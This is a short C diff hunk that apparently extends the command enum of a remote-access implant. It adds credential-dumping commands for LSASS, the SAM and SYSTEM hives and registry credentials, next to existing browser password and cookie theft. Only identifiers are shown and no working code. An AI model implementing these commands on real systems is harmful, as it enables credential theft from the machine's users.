@@ -107,6 +107,10 @@ typedef enum {
     CMD_DESKTOP_KEY,    /* Injection clavier */
     CMD_BROWSER_CREDS,  /* Extraction passwords navigateur */
     CMD_BROWSER_COOKIES,/* Extraction cookies navigateur */
+    CMD_LSASS_DUMP,     /* Dump LSASS */
+    CMD_SAM_DUMP,       /* Dump SAM */
+    CMD_SYSTEM_DUMP,    /* Dump SYSTEM */
+    CMD_REG_CREDS,      /* Credentials depuis le registre */
     CMD_MAX
 } command_type_t;
 
